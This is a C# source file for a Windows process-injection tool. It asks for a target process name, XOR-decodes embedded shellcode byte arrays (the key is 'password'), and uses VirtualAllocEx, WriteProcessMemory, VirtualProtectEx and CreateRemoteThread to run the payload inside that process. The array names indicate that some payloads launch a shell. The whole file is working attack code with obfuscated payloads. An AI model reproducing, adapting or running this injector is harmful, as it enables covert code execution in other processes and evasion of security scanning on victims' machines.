using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

//Works on self and notepad.exe
//VirtualAlloc, Writes, VirtualProtect and then createsRemoteThread with shellcode
// Make sure to change CPU to x64 bit to run 64bit shellcode, default is Any CPU which compiles as x32bit

namespace Simple_Injection
{
    class Program
    {

        [DllImport("kernel.dll")]
        private static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        private static extern bool IsWow64Process(
            [In] IntPtr hProcess,
            [Out] out bool lpSystemInfo);


        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(
            ProcessAccessFlags dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId
        );

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint dwSize,
            out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocEx(
           IntPtr hHandle,
           IntPtr lpStartAddr,
           uint size,
           UInt32 flAllocationType,
           UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool VirtualProtectEx(
           IntPtr hProcess,
           IntPtr lpAddress,
           int dwSize,
           uint flNewProtect,
           out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(
            IntPtr handle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        private enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection : uint
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PROCESS_ALL_ACCESS = 0x1F0FFF
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Enter your Process Name");
            string val = Console.ReadLine();
            IntPtr hProcess = GetProcess(val);
            IntPtr hThread;


            //Key is password, xor encrypted
            byte[] encryptedShellcode32 = new byte[] { 0x8c, 0x89, 0xf1, 0x73, 0x77, 0x6f, 0x12, 0xed, 0x95, 0x50, 0xb3, 0x17, 0xfc, 0x3f, 0x42, 0xef, 0x22, 0x6d, 0xf8, 0x21, 0x63, 0xe4, 0x00, 0x4c, 0x7f, 0xd6, 0x39, 0x55, 0x46, 0x90, 0xde, 0x58, 0x11, 0x1d, 0x71, 0x5f, 0x57, 0xae, 0xbd, 0x69, 0x71, 0xa6, 0x91, 0x81, 0x25, 0x38, 0xf9, 0x36, 0x60, 0xea, 0x39, 0x4f, 0xfc, 0x23, 0x63, 0x1c, 0x93, 0x29, 0x72, 0xa2, 0x26, 0xe4, 0x2b, 0x44, 0x71, 0xb2, 0xf8, 0x3a, 0x6f, 0x8c, 0x48, 0x2d, 0xfb, 0x55, 0xf8, 0x72, 0xa1, 0x5e, 0x8d, 0xc8, 0xb1, 0xae, 0x7e, 0x72, 0xb0, 0x57, 0x92, 0x11, 0x86, 0x62, 0x0e, 0x8b, 0x4c, 0x12, 0x56, 0x11, 0x94, 0x39, 0xf8, 0x2b, 0x53, 0x6e, 0xa1, 0x02, 0xfb, 0x6d, 0x38, 0xf8, 0x2f, 0x73, 0x73, 0xb7, 0xfb, 0x65, 0xf8, 0x72, 0xa7, 0xe6, 0x36, 0x40, 0x54, 0x3a, 0x28, 0x12, 0x2e, 0x35, 0x23, 0x9b, 0x90, 0x3e, 0x2c, 0x29, 0xfc, 0x7d, 0x99, 0xe9, 0x2d, 0x0b, 0x72, 0xfe, 0xf2, 0xdd, 0x72, 0x64, 0x70, 0x31, 0x1b, 0x42, 0xfc, 0x00, 0xf5, 0x9b, 0xa5, 0xda, 0x83, 0xc6, 0xd5, 0x39, 0x1a, 0xc2, 0xe5, 0xdc, 0xee, 0x8c, 0xa2, 0x53, 0x74, 0x18, 0x7a, 0xe1, 0x88, 0x93, 0x02, 0x6a, 0xc9, 0x23, 0x63, 0x13, 0x1c, 0x19, 0x77, 0x3c, 0x8d, 0xb1, 0x13, 0x00, 0x1f, 0x10, 0x59, 0x0a, 0x0a, 0x01, 0x70 };

            byte[] encryptedShellcode64 = new byte[] { 0x8c, 0x29, 0xf0, 0x97, 0x87, 0x87, 0xb2, 0x64, 0x70, 0x61, 0x32, 0x22, 0x36, 0x3f, 0x20, 0x35, 0x26, 0x29, 0x42, 0xa1, 0x12, 0x27, 0xf9, 0x36, 0x10, 0x29, 0xf8, 0x21, 0x6f, 0x27, 0xf9, 0x36, 0x50, 0x29, 0xf8, 0x01, 0x27, 0x27, 0x7d, 0xd3, 0x3a, 0x2b, 0x3e, 0x42, 0xbe, 0x27, 0x43, 0xa4, 0xdc, 0x5d, 0x12, 0x0f, 0x75, 0x43, 0x52, 0x25, 0xb1, 0xa8, 0x7e, 0x32, 0x76, 0xae, 0x90, 0x89, 0x22, 0x20, 0x22, 0x3b, 0xfc, 0x3d, 0x52, 0xef, 0x32, 0x5d, 0x3b, 0x72, 0xa7, 0xe4, 0xf2, 0xec, 0x70, 0x61, 0x73, 0x3b, 0xf2, 0xaf, 0x06, 0x03, 0x38, 0x60, 0xa3, 0x23, 0xfc, 0x27, 0x6a, 0x20, 0xfb, 0x21, 0x53, 0x3a, 0x76, 0xbf, 0x91, 0x32, 0x38, 0x9e, 0xba, 0x32, 0xfc, 0x5b, 0xfa, 0x2c, 0x71, 0xb7, 0x3e, 0x42, 0xbe, 0x27, 0x43, 0xa4, 0xdc, 0x20, 0xb2, 0xba, 0x7a, 0x2e, 0x73, 0xa5, 0x48, 0x81, 0x06, 0x82, 0x3b, 0x6c, 0x3e, 0x40, 0x78, 0x24, 0x4a, 0xa2, 0x02, 0xb7, 0x2a, 0x20, 0xfb, 0x21, 0x57, 0x3a, 0x76, 0xbf, 0x14, 0x25, 0xfb, 0x6d, 0x3b, 0x37, 0xfc, 0x2f, 0x6e, 0x2d, 0x71, 0xb1, 0x32, 0xf8, 0x73, 0xe7, 0x3a, 0x65, 0xa0, 0x20, 0x2b, 0x32, 0x2f, 0x31, 0x2b, 0x3e, 0x31, 0x39, 0x32, 0x2a, 0x36, 0x35, 0x3a, 0xe7, 0x9c, 0x41, 0x32, 0x21, 0x88, 0x8f, 0x2a, 0x25, 0x29, 0x3b, 0x3b, 0xf8, 0x65, 0x86, 0x25, 0x9b, 0x8f, 0x9e, 0x2e, 0x3b, 0xcd, 0x6e, 0x72, 0x64, 0x70, 0x61, 0x73, 0x73, 0x77, 0x27, 0xff, 0xe9, 0x71, 0x60, 0x73, 0x73, 0x36, 0xd5, 0x43, 0xef, 0x1f, 0xe6, 0x8c, 0xa6, 0xcc, 0x9f, 0xc7, 0xc6, 0x26, 0x20, 0xc9, 0xd5, 0xe2, 0xd2, 0xef, 0x9b, 0xa5, 0x29, 0xf0, 0xb7, 0x5f, 0x53, 0x74, 0x18, 0x7a, 0xe1, 0x88, 0x93, 0x02, 0x6a, 0xc9, 0x23, 0x63, 0x13, 0x1c, 0x19, 0x77, 0x36, 0x33, 0xed, 0xaa, 0x9e, 0xa6, 0x10, 0x16, 0x03, 0x11, 0x4a, 0x15, 0x19, 0x16, 0x73 };

            byte[] encryptedShellcode_shell_32 = new byte[] { 0x8c, 0x89, 0xf1, 0x73, 0x77, 0x6f, 0x12, 0xed, 0x95, 0x50, 0xb3, 0x17, 0xfc, 0x3f, 0x42, 0xef, 0x22, 0x6d, 0xf8, 0x21, 0x63, 0xe4, 0x00, 0x4c, 0x7f, 0xd6, 0x39, 0x55, 0x46, 0x90, 0xde, 0x58, 0x11, 0x1d, 0x71, 0x5f, 0x57, 0xae, 0xbd, 0x69, 0x71, 0xa6, 0x91, 0x81, 0x25, 0x38, 0xf9, 0x36, 0x60, 0xea, 0x39, 0x4f, 0xfc, 0x23, 0x63, 0x1c, 0x93, 0x29, 0x72, 0xa2, 0x26, 0xe4, 0x2b, 0x44, 0x71, 0xb2, 0xf8, 0x3a, 0x6f, 0x8c, 0x48, 0x2d, 0xfb, 0x55, 0xf8, 0x72, 0xa1, 0x5e, 0x8d, 0xc8, 0xb1, 0xae, 0x7e, 0x72, 0xb0, 0x57, 0x92, 0x11, 0x86, 0x62, 0x0e, 0x8b, 0x4c, 0x12, 0x56, 0x11, 0x94, 0x39, 0xf8, 0x2b, 0x53, 0x6e, 0xa1, 0x02, 0xfb, 0x6d, 0x38, 0xf8, 0x2f, 0x73, 0x73, 0xb7, 0xfb, 0x65, 0xf8, 0x72, 0xa7, 0xe6, 0x36, 0x40, 0x54, 0x3a, 0x28, 0x12, 0x2e, 0x35, 0x23, 0x9b, 0x90, 0x3e, 0x2c, 0x29, 0xfc, 0x7d, 0x99, 0xe9, 0x2d, 0x09, 0x40, 0x41, 0x77, 0x6f, 0x1a, 0x13, 0x03, 0x53, 0x2c, 0x27, 0x1f, 0x23, 0x05, 0x42, 0x77, 0x9e, 0xa6, 0xcb, 0xe7, 0x6e, 0x72, 0x64, 0x59, 0xa5, 0x27, 0x23, 0x1f, 0x46, 0xf2, 0x0f, 0x70, 0x9e, 0xa6, 0x23, 0x27, 0x3f, 0x22, 0x24, 0x20, 0x21, 0x23, 0x1b, 0x9d, 0x60, 0xad, 0x84, 0x8f, 0xb4, 0xe4, 0x19, 0x72, 0x07, 0x0d, 0x64, 0x70, 0x60, 0x1b, 0x71, 0x77, 0x7e, 0x2e, 0xed, 0x96, 0x0b, 0x63, 0x25, 0x20, 0x07, 0xeb, 0xc1, 0x04, 0x00, 0x8c, 0xa6, 0xf2, 0xaf, 0x06, 0x68, 0x8f, 0x2f, 0x7b, 0x06, 0x9b, 0x07, 0x82, 0xd1, 0xd2, 0x37, 0x8c, 0xa6, 0x1f, 0x0c, 0x1f, 0x00, 0x70, 0xe8, 0x90, 0x24, 0x20, 0x38, 0x43, 0x92, 0x1a, 0x73, 0x2a, 0x25, 0x95, 0x92, 0x14, 0xa3, 0x34, 0x45, 0x4f, 0x72, 0x76, 0xe2, 0x36, 0x40, 0x60, 0xa7, 0x73, 0x37, 0x23, 0x3f, 0x24, 0x32, 0x26, 0x27, 0x25, 0x3d, 0x21, 0x39, 0x21, 0x32, 0x18, 0x18, 0xbf, 0x4c, 0xf1, 0x90, 0xa7, 0xed, 0x90, 0x2f, 0x25, 0x35, 0x88, 0x5f, 0x1a, 0x6c, 0xf7, 0x7c, 0x13, 0x8c, 0xa2, 0xd4, 0x82, 0xd1, 0xd2, 0x37, 0x1b, 0xd5, 0xe2, 0xd2, 0xef, 0x9b, 0xa5, 0x5d, 0x75, 0x0f, 0x7d, 0xef, 0x89, 0x84, 0x05, 0x64, 0xc8, 0x34, 0x64, 0x1d, 0x1d, 0x0e, 0x70, 0x32, 0x8c, 0xa6 };

            byte[] encryptedShellcode_shell_64 = new byte[] { 0x8c, 0x29, 0xf0, 0x97, 0x87, 0x87, 0xb2, 0x64, 0x70, 0x61, 0x32, 0x22, 0x36, 0x3f, 0x20, 0x35, 0x26, 0x29, 0x42, 0xa1, 0x12, 0x27, 0xf9, 0x36, 0x10, 0x29, 0xf8, 0x21, 0x6f, 0x27, 0xf9, 0x36, 0x50, 0x29, 0xf8, 0x01, 0x27, 0x27, 0x7d, 0xd3, 0x3a, 0x2b, 0x3e, 0x42, 0xbe, 0x27, 0x43, 0xa4, 0xdc, 0x5d, 0x12, 0x0f, 0x75, 0x43, 0x52, 0x25, 0xb1, 0xa8, 0x7e, 0x32, 0x76, 0xae, 0x90, 0x89, 0x22, 0x20, 0x22, 0x3b, 0xfc, 0x3d, 0x52, 0xef, 0x32, 0x5d, 0x3b, 0x72, 0xa7, 0xe4, 0xf2, 0xec, 0x70, 0x61, 0x73, 0x3b, 0xf2, 0xaf, 0x06, 0x03, 0x38, 0x60, 0xa3, 0x23, 0xfc, 0x27, 0x6a, 0x20, 0xfb, 0x21, 0x53, 0x3a, 0x76, 0xbf, 0x91, 0x32, 0x38, 0x9e, 0xba, 0x32, 0xfc, 0x5b, 0xfa, 0x2c, 0x71, 0xb7, 0x3e, 0x42, 0xbe, 0x27, 0x43, 0xa4, 0xdc, 0x20, 0xb2, 0xba, 0x7a, 0x2e, 0x73, 0xa5, 0x48, 0x81, 0x06, 0x82, 0x3b, 0x6c, 0x3e, 0x40, 0x78, 0x24, 0x4a, 0xa2, 0x02, 0xb7, 0x2a, 0x20, 0xfb, 0x21, 0x57, 0x3a, 0x76, 0xbf, 0x14, 0x25, 0xfb, 0x6d, 0x3b, 0x37, 0xfc, 0x2f, 0x6e, 0x2d, 0x71, 0xb1, 0x32, 0xf8, 0x73, 0xe7, 0x3a, 0x65, 0xa0, 0x20, 0x2b, 0x32, 0x2f, 0x31, 0x2b, 0x3e, 0x31, 0x39, 0x32, 0x2a, 0x36, 0x35, 0x3a, 0xe7, 0x9c, 0x41, 0x32, 0x21, 0x88, 0x8f, 0x2a, 0x25, 0x29, 0x3b, 0x3b, 0xf8, 0x65, 0x86, 0x25, 0x9b, 0x8f, 0x9e, 0x2e, 0x3a, 0xc9, 0x18, 0x01, 0x56, 0x2f, 0x52, 0x41, 0x73, 0x77, 0x2e, 0x24, 0x2d, 0xf9, 0x87, 0x3b, 0xf2, 0x9b, 0xcf, 0x73, 0x64, 0x70, 0x28, 0xfa, 0x96, 0x3e, 0xd3, 0x70, 0x64, 0x61, 0x3d, 0x0c, 0x73, 0x77, 0x6e, 0x33, 0x30, 0x39, 0xe8, 0x97, 0x3f, 0xfe, 0x9e, 0x33, 0xde, 0x3c, 0x16, 0x55, 0x74, 0x88, 0xba, 0x3e, 0xed, 0x9a, 0x09, 0x72, 0x72, 0x77, 0x6f, 0x2b, 0x25, 0xca, 0x48, 0xf3, 0x18, 0x77, 0x90, 0xa7, 0x34, 0x20, 0x2c, 0x42, 0xba, 0x3a, 0x5e, 0xb2, 0x2c, 0x8f, 0xa1, 0x3b, 0xfa, 0xb5, 0x27, 0x8d, 0xa4, 0x38, 0xe8, 0xb2, 0x32, 0xcd, 0x85, 0x7d, 0xbb, 0x90, 0x9e, 0xa6, 0x3b, 0xfe, 0xa8, 0x18, 0x74, 0x31, 0x39, 0x3f, 0xfa, 0x95, 0x27, 0xfb, 0x9d, 0x31, 0xdb, 0xea, 0xd6, 0x03, 0x0e, 0x8d, 0xb1, 0x38, 0xe0, 0xb7, 0x33, 0x75, 0x6f, 0x72, 0x2d, 0xc8, 0x02, 0x1e, 0x17, 0x77, 0x6f, 0x72, 0x64, 0x70, 0x20, 0x23, 0x32, 0x27, 0x27, 0xfb, 0x86, 0x27, 0x36, 0x24, 0x3e, 0x46, 0xaf, 0x18, 0x69, 0x29, 0x20, 0x23, 0x91, 0x8b, 0x09, 0xb5, 0x20, 0x54, 0x35, 0x72, 0x72, 0x3f, 0xe2, 0x36, 0x40, 0x68, 0xa7, 0x73, 0x1b, 0x3f, 0xe6, 0x94, 0x32, 0x20, 0x20, 0x23, 0x32, 0x27, 0x2e, 0x22, 0x2d, 0x8f, 0xa1, 0x32, 0x23, 0x3e, 0x90, 0xba, 0x29, 0xf9, 0xa0, 0x3f, 0xfa, 0xb6, 0x2e, 0xc8, 0x1d, 0xbc, 0x5e, 0xf5, 0x8c, 0xa2, 0x27, 0x43, 0xb6, 0x38, 0x9e, 0xb9, 0xf8, 0x79, 0x2e, 0xc8, 0x6c, 0xf7, 0x7c, 0x13, 0x8c, 0xa2, 0xd4, 0x82, 0xd1, 0xd2, 0x37, 0x32, 0xc9, 0xd1, 0xfa, 0xcf, 0xf9, 0x8f, 0xb4, 0x3b, 0xf0, 0xb3, 0x47, 0x4e, 0x62, 0x0c, 0x6b, 0xf3, 0x88, 0x97, 0x1a, 0x77, 0xdf, 0x37, 0x72, 0x01, 0x1c, 0x1d, 0x6f, 0x2b, 0x25, 0xf9, 0xbb, 0x8c, 0xa6 };

            bool value;

            value = Is64Bit(hProcess);

            Byte[] temp_shellcode;

            Byte[] key = Encoding.ASCII.GetBytes("password");

          
            Console.WriteLine("IsWow64Process  " + value);

            if (value)
            {
                Console.WriteLine("x64 process");
                temp_shellcode = encryptedShellcode_shell_64;
            }
            else
            {
                Console.WriteLine("x86 process");
                temp_shellcode = encryptedShellcode_shell_32;
            }


            byte[] shellcode = new byte[temp_shellcode.Length];
            for (int i = 0; i < temp_shellcode.Length; i++)
            {
                shellcode[i] = (byte)(temp_shellcode[i] ^ key[i % key.Length]);
            }


            //Allocate Space for the shellcode in the process
            IntPtr funcAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_READWRITE);

            Console.WriteLine("Function address: " + funcAddr);

            UIntPtr bytesWritten;
            //Write the Shellcode to the Process
            WriteProcessMemory(hProcess, funcAddr, shellcode, (uint)shellcode.Length, out bytesWritten);

            uint temp = 0;
            bool resultVP = VirtualProtectEx(hProcess, funcAddr, shellcode.Length, (uint)Protection.PAGE_EXECUTE_READ, out temp);

            //Execute
            uint lpThreadId;
            hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, out lpThreadId);
            Console.WriteLine("[+] Thread ID: " + lpThreadId);

            Console.WriteLine("Pause");


            if (hThread != IntPtr.Zero)
            {
                Console.WriteLine("Injection Successful");
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            else
            {
                Console.WriteLine("Injection failed");
            }

        }
        public static bool Is64Bit(IntPtr process)
        {

            if (IntPtr.Size == 4) //32 bit machine, therefore process must be 32 bit
            {
                return false;
            }
            else if (IntPtr.Size == 8) //64-bit machine, therefore need to check if it is a 32bit running on 64 or 64 running on 64bit
            {
                bool value;
                IsWow64Process(process, out value);

                if (value) //if it is a Wow64 process, then it is 32-bit as we are on a 64bit system
                {
                    return false;
                }
                else //if 64 process on 64 bit system then true
                {
                    return true;
                }
            }
            return false;
        }
        static IntPtr GetProcess(string s)
        {
            try
            {
                Process proc = Process.GetProcessesByName(s)[0];
                IntPtr windowHandle = OpenProcess(ProcessAccessFlags.VirtualMemoryOperation | ProcessAccessFlags.VirtualMemoryRead | ProcessAccessFlags.VirtualMemoryWrite, false, proc.Id);
                return windowHandle;
            }
            catch (IndexOutOfRangeException)
            {
                return GetCurrentProcess();
            }

        }

    }
}

